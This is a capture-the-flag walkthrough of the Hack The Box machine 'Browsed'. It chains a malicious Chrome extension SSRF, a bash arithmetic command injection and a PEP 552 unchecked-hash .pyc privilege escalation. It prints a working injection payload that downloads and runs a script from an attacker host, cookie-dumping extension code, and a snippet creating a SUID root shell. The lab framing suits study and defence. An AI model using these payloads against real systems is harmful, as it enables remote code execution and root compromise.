# Browsed — Hack The Box, Medium, Linux

**TL;DR:** The site runs every Chrome extension you upload, so an MV3 service
worker is an SSRF with a console-log side channel — and it reaches a loopback
Flask app whose source is sitting in an anonymous Gitea on an unlinked vhost.
That app hands a path segment to a bash script that tests it with
`[[ "$1" -eq 0 ]]`, and arithmetic evaluation performs command substitution;
`${HOME:0:1}` supplies the slashes the route converter refuses. Root is a
`sudo`-able Python tool whose `__pycache__` is mode 0777 — a PEP 552
unchecked-hash `.pyc` is loaded without the interpreter ever reading the source.

> Linux box. Two ports. The whole machine is one idea taken to its conclusion:
> *what if the browser is the attacker's process?*

*Flags redacted. Machine address generalised to `10.129.x.x` and the attacker
host to `10.10.14.x`.*

---

## Recon

`nmap -p-` returns two ports and stops being interesting immediately:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Ubuntu 24.04. Nothing exotic. Per the memory file: *small port count raises the
value of each port* — the path is in the web app, so read the web app instead of
reaching for a scanner.

The site calls itself `Browsed.htb` and is an HTML5UP template with three pages.
The copy is the finding:

> People can share their **chrome version 134** based extension with us, and
> we'll try them out for some time!

> To send us an extension, visit the upload page to upload your chrome
> extension, in zip format. Make sure your files are directly inside the archive,
> and not in a folder!

`/upload.php` takes a `.zip` and says *"Output (takes ~10s)"*, polling
`upload.php?output=1`. `/samples.html` hands out three working sample extensions
— which is generous, because it removes all guesswork about the expected
manifest shape. They're plain MV3: `manifest.json`, a content script, maybe a
popup.

So: **you upload JavaScript, and the server runs it in a real Chrome.** That is
the entire machine. Everything after this is working out what that browser can
see.

## First contact — build the feedback loop before building the exploit

The temptation is to go straight for a payload. Don't: you have no idea yet what
comes back in that output box. Upload something that only proves the channel.

```json
{
  "manifest_version": 3,
  "name": "Probe",
  "version": "1.0.0",
  "background": { "service_worker": "bg.js" },
  "content_scripts": [
    { "matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_start" }
  ]
}
```

```js
console.log("PWNLOOP-BG-HELLO extension worker started");
console.log("PWNLOOP-UA " + navigator.userAgent);
```

**First trap:** the upload returns `Invalid file type or size.` The server checks
`$_FILES['extension']['type'] === 'application/zip'`, which is the *client-declared*
MIME type. `curl -F "extension=@x.zip"` sends `application/octet-stream`. Fix:

```bash
curl -F "extension=@ext.zip;type=application/zip" http://10.129.x.x/upload.php
```

Then poll `upload.php?output=1` **with the same session cookie** — the output is
stored in `$_SESSION`, so a cookie jar is mandatory.

What comes back is 580 lines of Chrome's verbose log, because the launcher uses
`--enable-logging=stderr --v=1`. Buried in it:

```
[..:INFO:CONSOLE(1)] "PWNLOOP-BG-HELLO extension worker started", source: chrome-extension://…/bg.js
[..:INFO:CONSOLE(1)] "PWNLOOP-CONTENT extension on http://browsedinternals.htb/"
[..:INFO:CONSOLE(1)] "PWNLOOP-CONTENT extension on http://localhost/"
```

Three things at once:

1. **`console.log` is an exfiltration channel.** The SSRF you're about to build is
   not blind.
2. The browser visits **`http://browsedinternals.htb/`** — a vhost nothing on the
   public site links to.
3. Chrome runs from `/opt/chrome-linux64` with `HOME=/var/www`, under `xvfb-run`
   (the log shows an X11 display at 1280x1024), and the profile is a throwaway.

Also visible in the same log: `browsedinternals.htb/assets/js/index.js?v=1.24.5`.
That `?v=` is a product version fingerprint before you've even loaded the page.

## browsedinternals.htb — Gitea, and it answers to anyone

The vhost is not actually internal. nginx routes on the `Host:` header with no
source restriction, so:

```bash
curl -H "Host: browsedinternals.htb" http://10.129.x.x/
```

…returns Gitea 1.24.5. Anonymous `/explore/repos` gives one repository:
`larry/MarkdownPreview`, cloneable with no credentials.

```
README.md      "This webapp allows us to convert our md files to html.
                Still in developement, it should only run locally !!!"
app.py
routines.sh
backups/  files/  log/
```

`app.py` is Flask, `app.run(host='127.0.0.1', port=5000)`, deployed (per the
absolute paths in `routines.sh`) at `/home/larry/markdownPreview`. So there is a
service on the box you cannot reach — and you're holding its source.

The interesting route:

```python
@app.route('/routines/<rid>')
def routines(rid):
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

The comment is proud of itself. `shell=False` is genuinely the right call — and it
does not matter, because the sink is one file over:

```bash
if [[ "$1" -eq 0 ]]; then
```

`[[ a -eq b ]]` evaluates **both sides as arithmetic expressions**, and bash's
arithmetic evaluator performs command substitution. `a[$(id)]` parses as an array
subscript, the subscript is arithmetic-evaluated, and `id` runs. This is the
classic "unquoted arithmetic context" injection, and it survives every precaution
taken on the Python side.

## Reaching 127.0.0.1 — the extension is the SSRF

An MV3 extension declaring `host_permissions: ["<all_urls>"]` can `fetch()`
cross-origin from its service worker with no CORS involvement. The Flask app's
loopback binding is a boundary against the network, not against a browser running
*on* the host.

```js
const r = await fetch("http://127.0.0.1:5000/");
console.log("PWN|" + r.status + " " + (await r.text()).slice(0, 800));
```

Result, straight back through the log:

```
PWN|OK http://127.0.0.1:5000/ status=200 len=266
PWN|BODY … <h1>Markdown Previewer</h1> …
PWN|OK http://127.0.0.1:3000/ status=200 len=13800     (Gitea)
PWN|ERR http://127.0.0.1:8080/ TypeError: Failed to fetch
```

The same extension, with the `cookies` permission, dumps the browser's cookie jar
including HttpOnly cookies — worth doing, though on this box the profile is fresh
each run and holds only an anonymous Gitea session, so it's a dead end. Log it and
move on.

## Building the payload — no `/` allowed

The injection goes in a Flask path segment, and the default `<rid>` converter
rejects `/`. Every useful command wants slashes.

You never need a literal one. `${HOME:0:1}` is `/`, and parameter expansion works
normally inside the `$( )` that the arithmetic evaluator runs. Word separators
come from `${IFS}`. So:

```
a[$(curl${IFS}-s${IFS}-o${IFS}${HOME:0:1}tmp${HOME:0:1}.s${IFS}http:${HOME:0:1}${HOME:0:1}10.10.14.x:8000${HOME:0:1}s;bash${IFS}${HOME:0:1}tmp${HOME:0:1}.s)]
```

URL-encode the whole thing with `encodeURIComponent` in the extension, fetch
`http://127.0.0.1:5000/routines/<encoded>`, and read `200 Routine executed !`
in the log.

The staged script appends an SSH key to `~/.ssh/authorized_keys` — a plain
reverse shell also works, but the box has `22/tcp` open, and an SSH session is a
far better place to enumerate from than a raw `nc` shell. `ssh -i key larry@…`,
and `user.txt` is right there.

### Leads that failed, and why

- **`chrome.debugger` / `--remote-debugging-port`.** The launcher passes
  `--remote-debugging-port=0`, i.e. a random port, and Chrome lives 10 seconds.
  Tempting, unnecessary — a plain `fetch()` already crosses the boundary.
- **Reading files via the extension.** `fetch('file:///etc/passwd')` from an
  extension needs "Allow access to file URLs", which `--load-extension` does not
  grant. Not the way in.
- **Stealing a Gitea session from the bot.** The cookie jar is real and readable,
  but the profile is recreated per run and never logged in. A correct idea against
  the wrong target.
- **The three sample extensions.** They contain no secrets. They exist to teach
  you the manifest format, and that's all.

## root — the world-writable `__pycache__`

```
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

```
-rwxrwxr-x 1 root root  2739 extension_tool.py
-rw-rw-r-- 1 root root  1245 extension_utils.py
drwxrwxrwx 2 root root  4096 __pycache__      <-- 0777
```

Neither `.py` is writable by `larry` (group is `root`). The cache directory is
writable by everybody.

The tool's very first statement is:

```python
from extension_utils import validate_manifest, clean_temp_files
```

The obvious objection is that Python validates a cached `.pyc` against its source
— timestamp and size — and recompiles on mismatch, so planting bytecode should be
useless. That is true of the *default* invalidation mode. It is not true of
**PEP 552 hash-based `.pyc` files with the "unchecked" flag set**: the second word
of the header carries `flags`, and `flags & 0b11 == 0b01` means *hash-based,
do not check*. The interpreter loads it without ever looking at the source.

`py_compile` will produce one for you:

```python
import py_compile
py_compile.compile(
    '/tmp/.pl/extension_utils.py',
    cfile='/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc',
    dfile='extension_utils.py',
    invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
)
```

The header confirms it — `cb0d0d0a` magic (3.12) followed by `01000000`:

```
00000000: cb0d 0d0a 0100 0000 ea9d 571d c7d8 16d9
                    ^^^^^^^^^ flags = 1, unchecked hash
```

The planted module keeps working stubs for `validate_manifest` and
`clean_temp_files` so the tool still runs, and does its real work at module
scope:

```python
shutil.copy('/bin/bash', '/tmp/.rb')
os.chown('/tmp/.rb', 0, 0)
os.chmod('/tmp/.rb', 0o4755)
```

Then:

```bash
sudo /opt/extensiontool/extension_tool.py --ext Fontify
/tmp/.rb -p -c 'id; cat /root/root.txt'
```

```
uid=1000(larry) gid=1000(larry) euid=0(root)
```

`uid=0` only in the *effective* slot — the tell that you got here through a SUID
binary rather than a login, exactly as the methodology notes predict.

## What the box is teaching

Two lessons, and they rhyme.

**A sandbox that shares the host's network namespace is not a sandbox.** The
developers were careful: the Previewer binds `127.0.0.1`, the Gitea is on an
"internal" vhost, the README says *should only run locally*. All three assume the
attacker is on the far side of the network stack. Handing an attacker a browser
process puts them on the near side, and every one of those controls evaporates at
once. `--no-sandbox` in the launcher is the same mistake spelled out loud.

**Sanitising the wrong layer is worse than not sanitising.** `subprocess.run` with
a list and no `shell=True`, plus a comment saying `NO shell`, is a security
control that ends one line before the vulnerability. The bug is in `[[ -eq ]]`,
and no amount of care in Python reaches it. Wherever a program hands data to a
shell script, the shell script is where the boundary actually is.

The privesc is the same shape a third time: file permissions on the `.py` files
were reviewed and correct, and the directory Python actually loads code from was
`chmod 777` and never looked at.
